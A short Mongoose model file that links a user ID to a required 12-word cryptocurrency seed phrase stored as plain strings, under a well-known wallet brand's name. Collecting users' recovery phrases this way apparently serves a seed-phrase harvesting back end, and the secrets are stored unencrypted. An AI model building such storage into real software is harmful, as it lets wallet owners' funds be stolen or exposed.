// models/TrustWallet.js

const mongoose = require('mongoose');

const WalletSchema = new mongoose.Schema({
    userId: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'User',
        required: true,
    },
    seedPhrase: {
        type: [String], // Store as an array of 12 words
        validate: [arrayLimit, '{PATH} must contain exactly 12 words'],
        required: true,
    },
    date: {
        type: Date,
        default: Date.now,
    },
});

function arrayLimit(val) {
    return val.length === 12;
}

const TrustWallet = mongoose.model('Wallet', WalletSchema);
module.exports = TrustWallet;
